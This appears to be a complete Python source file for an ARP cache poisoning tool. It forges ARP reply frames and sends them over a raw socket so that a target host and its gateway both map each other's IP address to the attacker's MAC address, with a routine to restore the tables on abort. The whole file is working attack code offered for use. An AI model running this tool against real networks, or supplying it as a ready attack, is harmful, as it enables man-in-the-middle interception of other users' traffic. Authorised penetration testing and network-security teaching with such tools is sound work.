#!/usr/bin/env python3
# https://github.com/EONRaider/Arp-Spoofer

__author__ = 'EONRaider @ keybase.io/eonraider'

"""
A low-level ARP Cache Poisoning (a.k.a "ARP Spoofing") tool.
"""

import argparse
import re
import time
from itertools import count
from socket import htons, inet_aton, ntohs, socket, PF_PACKET, SOCK_RAW


i = ' ' * 4  # Basic indentation level


def hardware_to_hex(mac):
    return b''.join(bytes.fromhex(octet) for octet in re.split('[:-]', mac))


class EthernetFrame(object):
    def __init__(self, dest_hdwr: str, source_hdwr: str, ethertype: bytes):
        self.dest_hdwr = dest_hdwr
        self.source_hdwr = source_hdwr
        self.ethertype = ethertype
        self.bytes_dest_hdwr = hardware_to_hex(self.dest_hdwr)
        self.bytes_source_hdwr = hardware_to_hex(self.source_hdwr)

    @property
    def payload(self):  # Defined by IEEE 802.3
        return self.bytes_dest_hdwr + self.bytes_source_hdwr + self.ethertype


class ARPPacket(object):
    def __init__(self, sender_hdwr: str, sender_proto: str,
                 target_hdwr: str, target_proto: str,
                 ethertype: bytes = b'\x08\x06',  # ARP EtherType code
                 htype: bytes = b'\x00\x01',      # Ethernet
                 ptype: bytes = b'\x08\x00',      # IP
                 hlen: bytes = b'\x06',
                 plen: bytes = b'\x04',
                 oper: bytes = b'\x00\x02'):      # ARP REPLY message
        self.sender_hdwr = sender_hdwr
        self.sender_proto = sender_proto
        self.target_hdwr = target_hdwr
        self.target_proto = target_proto
        self.ethertype = ethertype
        self.htype = htype
        self.ptype = ptype
        self.hlen = hlen
        self.plen = plen
        self.oper = oper

    def __set_hardware_addrs_as_bytes(self, *args):
        def hdwr_to_hex(mac):
            return b''.join(bytes.fromhex(octet) for octet in
                            re.split('[:-]', mac))
        for hdwr, hdwr_addr in zip(('b_sender_hdwr', 'b_target_hdwr'), args):
            setattr(self, hdwr, hdwr_to_hex(hdwr_addr))

    def __set_protocol_addrs_as_bytes(self, *args):
        for proto, proto_addr in zip(('b_sender_proto', 'b_target_proto'), args):
            setattr(self, proto, inet_aton(proto_addr))

    def __build_ethernet_frame(self):  # Defined by IEEE 802.3
        self.ethernet_frame = self.b_target_hdwr \
                              + self.b_sender_hdwr \
                              + self.ethertype

    def __build_arp_payload(self, *args):  # Defined by IETF RFC 826
        self.arp_payload = b''.join(args) \
                           + self.b_sender_hdwr \
                           + self.b_sender_proto \
                           + self.b_target_hdwr \
                           + self.b_target_proto

    @property
    def contents(self):
        self.__set_hardware_addrs_as_bytes(self.sender_hdwr, self.target_hdwr)
        self.__set_protocol_addrs_as_bytes(self.sender_proto, self.target_proto)
        self.__build_ethernet_frame()
        self.__build_arp_payload(self.htype, self.ptype, self.hlen, self.plen,
                                 self.oper)
        return b''.join((self.ethernet_frame, self.arp_payload))


class AttackPackets(object):
    def __init__(self, attacker_mac: str, gateway_mac: str, gateway_ip: str,
                 target_mac: str, target_ip: str):
        self.restore_tables: bool = False
        self.attacker_mac = attacker_mac
        self.gateway_mac = gateway_mac
        self.gateway_ip = gateway_ip
        self.target_mac = target_mac
        self.target_ip = target_ip
        self.packet_to_gateway = self.gateway_packet
        self.packet_to_target = self.target_packet

    def __iter__(self):
        yield from (self.packet_to_gateway, self.packet_to_target)

    @property
    def gateway_packet(self):
        source_mac_addr = self.attacker_mac if self.restore_tables is False \
            else self.target_mac
        packet_to_gateway = ARPPacket(source_mac_addr, self.target_ip,
                                      self.gateway_mac, self.gateway_ip)
        return packet_to_gateway.contents

    @property
    def target_packet(self):
        source_mac_addr = self.attacker_mac if self.restore_tables is False \
            else self.gateway_mac
        packet_to_target = ARPPacket(source_mac_addr, self.gateway_ip,
                                     self.target_mac, self.target_ip)
        return packet_to_target.contents

    def restore_arp_tables(self, option: bool = True):
        self.restore_tables: bool = option
        self.packet_to_gateway = self.gateway_packet
        self.packet_to_target = self.target_packet


class Spoofer(object):
    def __init__(self, interface: str, *, arp_packets):
        self.interface = interface
        self.arp_packets = arp_packets

    def execute(self, *, max_packets: int, interval: float):
        with socket(PF_PACKET, SOCK_RAW, ntohs(0x0800)) as sock:
            sock.bind((self.interface, htons(0x0800)))
            for packet_count in count(start=1):
                for packet in self.arp_packets:
                    sock.send(packet)
                time.sleep(interval)
                if packet_count == max_packets:
                    break


def spoof(args):
    """Controls the flow of execution of the ARP Spoofer tool."""
    packets = AttackPackets(attacker_mac=args.attackermac,
                            gateway_mac=args.gatemac, gateway_ip=args.gateip,
                            target_mac=args.targetmac, target_ip=args.targetip)
    spoofer = Spoofer(interface=args.interface, arp_packets=packets)

    current_time = time.strftime("%H:%M:%S", time.localtime())
    print('[+] ARP Spoofing attack initiated at {0}. Press Ctrl-C to '
          'abort.'.format(current_time))
    try:
        spoofer.execute(max_packets=args.maxpackets, interval=args.interval)
    except KeyboardInterrupt:
        print('[!] Aborting ARP Spoofing attack...')
        print('{0}[+] Attempting to restore target ARP tables to their '
              'previous states...'.format(i))
        packets.restore_arp_tables()
        spoofer.execute(max_packets=20, interval=1)
        raise SystemExit('{0}[+] ARP Spoofing attack terminated.'.format(i))


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='Execute ARP Cache Poisoning attacks (a.k.a "ARP '
                    'Spoofing") on local networks.')
    parser.add_argument('interface', type=str,
                        help='Interface on the attacker machine to '
                             'send/receive packets from.')
    parser.add_argument('--attackermac', type=str, required=True, metavar='MAC',
                        help='MAC address of the Network Interface Controller '
                             '(NIC) used by the attacker.')
    parser.add_argument('--gatemac', type=str, required=True, metavar='MAC',
                        help='MAC address of the NIC associated to the '
                             'gateway.')
    parser.add_argument('--targetmac', type=str, required=True, metavar='MAC',
                        help='MAC address of the NIC associated to the target.')
    parser.add_argument('--gateip', type=str, required=True, metavar='IP',
                        help='IP address currently assigned to the gateway.')
    parser.add_argument('--targetip', type=str, required=True, metavar='IP',
                        help='IP address currently assigned to the target.')
    parser.add_argument('--interval', type=float, default=0.5,
                        metavar='SECONDS',
                        help='Time to wait between transmission of each set of '
                             'ARP Cache Poisoning attack packets (set to 0.5 '
                             'seconds by default).')
    parser.add_argument('--maxpackets', type=int, default=0, metavar='PACKETS',
                        help='Maximum number of packets to transmit to the '
                             'targets during the attack (set to 0 to send an '
                             'infinite number of packets by default).')
    cli_args = parser.parse_args()
    spoof(cli_args)
